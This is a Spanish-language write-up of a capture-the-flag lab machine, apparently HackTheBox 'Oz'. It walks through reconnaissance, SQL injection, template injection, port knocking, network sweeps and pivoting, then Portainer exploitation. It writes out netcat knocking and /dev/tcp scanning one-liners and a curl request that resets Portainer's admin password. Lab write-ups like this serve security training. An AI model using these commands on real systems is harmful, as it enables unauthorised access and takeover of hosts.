## Técnicas utilizadas
- SQL Injection (SQLI)  
- Server Side Template Injection (SSTI) (RCE)  
- Abusing Knockd  
- Network enumeration techniques using bash oneliners  
- PIVOTING  
- Portainer 1.11.1 Exploitation - Resetting the admin password  
- Creating a new container from Portainer (Privilege Escalation)
## Procedimiento

![[Pasted image 20230627140859.png]]

#### Reconocimiento
Si lanzamos un escaneo con **nmap** podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p80,8080 10.10.10.96 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 12:54 MST
Nmap scan report for 10.10.10.96
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```
Un escaneo con **whatweb** sobre la pagina web nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.96:8080
http://10.10.10.96:8080 [302 Found] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.14.1 Python/2.7.14], IP[10.10.10.96], Python[2.7.14], RedirectLocation[http://10.10.10.96:8080/login], Title[Redirecting...], Werkzeug[0.14.1]
http://10.10.10.96:8080/login [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/0.14.1 Python/2.7.14], IP[10.10.10.96], JQuery, PasswordField[password], Python[2.7.14], Script, Title[GBR Support - Login], Werkzeug[0.14.1], X-UA-Compatible[IE=edge]

# whatweb 10.10.10.96
http://10.10.10.96 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.14.1 Python/2.7.14], IP[10.10.10.96], Python[2.7.14], Title[OZ webapi], Werkzeug[0.14.1]
```


-------------
#### SQL Injection (SQLI) 
Encontramos una entrada vulnerable en la aplicacion web, podemos percatarnos de la inyección SQL por que el output con **wfuzz** nos avienta un **500 internal server error**  cuando aparece una **comilla**:
![[Pasted image 20230628130609.png]]

Eumerando las **Bases de Datos** podemos encontrar unas credenciales, la contraseña esta *hasheada* pero podemos intentar remperlo con **hashcat** o **john**.

---------
#### Server Side Template Injection (SSTI) (RCE)
Dentro del dashboard del usuario, podemos añadir nuevos comentarios o sugerencias. Si interceptamos la petición con **BurpSuite** e intentamos alguna inyección tipica de **Server Side Template Injection** veremos que si es vulnerable:
![[Pasted image 20230628152756.png]]

Podemos intentar entablarnos una reverse shell aprovechandonos de **SSTI**

----------
#### Abusing Knockd
Enumerando la maquina, podemos ver que hay un archivo **knockd.conf**. vemos que si tocamos a ciertos puertos puodemos habilitar el puerto **22 - SSH** de la maquina victima. Hay herramientas que automatizan el golpeo de puertos como **knockd** ( `apt install knockd` ) pero tambien lo podemos hacer con el propio **netcat** de la siguiente manera:
```
# for i in <port> <port> <port>; do echo "test" | nc -u -w 1 <ip> $i; nmap -p22 --open -T5 -v -n <ip>; done
```

Vemos que se abre pero realmente no nos sirve de mucho ya que este se cierra.
Enumerando mas el sistema, damos con unas contraseñas para conectarnos a la base de datos.

#### Network enumeration techniques using bash oneliners 
Es posible que existan más contenedores en nuestro segmento de red, ya que en el archivo de configuración del docker se habla de otra **IP**. Podemos enumerar todos los hosts de nuestro segmento de red con un **onliner** en bash:
```
# for i in $(seq 0 254); do (ping -c 1 172.19.0.$i | grep "bytes from"&); done
```

Si la maquina contara con **fping** seria más facil aplicar un barrido por todos los hosts existentes de la siguiente manera:
```
# fping -g 10.100.10.0/24
```

Una vez con los hosts detectados, podemos proceder a enumar los puertos disponibles para cada uno de ellos de ls giuiente manera:
```
# for port in $(seq 1 65535); do echo ' ' > /dev/tcp/10.100.10.4/$port && echo "[+] Puerto encontrado -> $port"
```

Al final tenemos el host: **10.100.10.4** y el puerto **3306 - mysql**. Podemos intentar conectarnos a la base de datos con las credenciales encontradas. Podemos obtener una **id_rsa** de la maquina con la función **load_file()** de **mysql**.

----------
#### PIVOTING
La **id_rsa** viene con encriptación la cual podemos romper con **ssh2john**. Una vez rota nos podemos conectar a la maquina proporcionando la **id_rsa**:
```
# for i in 40809 50212 46969; do echo "test" | nc -w 1 -u 10.10.10.96 $i; done; ssh -i id_rsa dorthi@10.10.10.96
```

#### Portainer 1.11.1 Exploitation - Resetting the admin password  
Listando las **network configuration** de los contendores, podemos encontrar uno que esta corriendo **Portainer**.

La maquina cuenta con **nmap** asi que podemos hacer un barrido de puertos comodamente a esa **IP**. Encontramos un puerto que contiene un servidor web. Podemos hacer port forwarding y traernos el sitio web a nuestra maquina para mayor comodidad.

Al inspeccionar la pagina, podemos ver que hay un panel de inicio de sesión. Intentando con alguna de las credenciales que habiamos encontrado, vemos que ninguna funciona. Sin embargo, si intentamos listar vulnerabilidades para la versión actualmente en uso, encontramos una que nos permite cambiar la contraseña al usuario **administrador**:
![[Pasted image 20230628203734.png]]

La vulnerabilidad basicamente conssiten en mandar un **usuario** y una **contraseña** por **POST** a la siguiente **URL**:
```java
# curl -s -X POST "http://<ip>/api/users/admin/init" -H 'Content-Type: application/json' -d '{"password":"pipipopo"}'
```

----------
#### Creating a new container from Portainer (Privilege Escalation)
Una vez dentro de la suit de **portainer** podemos crear un contenedor que contenga la raiz de la maquina victima. 
